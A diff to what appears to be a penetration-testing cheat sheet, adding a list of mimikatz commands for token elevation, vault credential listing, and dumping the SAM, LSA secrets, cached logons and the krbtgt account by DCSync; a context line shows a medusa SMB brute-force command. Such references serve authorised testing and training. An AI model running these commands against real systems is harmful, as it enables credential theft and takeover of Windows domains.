@@ -442,6 +442,19 @@ $ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
 
 > https://github.com/gentilkiwi/mimikatz
 
+### Common Commands
+
+```c
+mimikatz # token::elevate
+mimikatz # token::revert
+mimikatz # vault::cred
+mimikatz # vault::list
+mimikatz # lsadump::sam
+mimikatz # lsadump::secrets
+mimikatz # lsadump::cache
+mimikatz # lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
+```
+
 ### Dump Hshes
 
 ```c
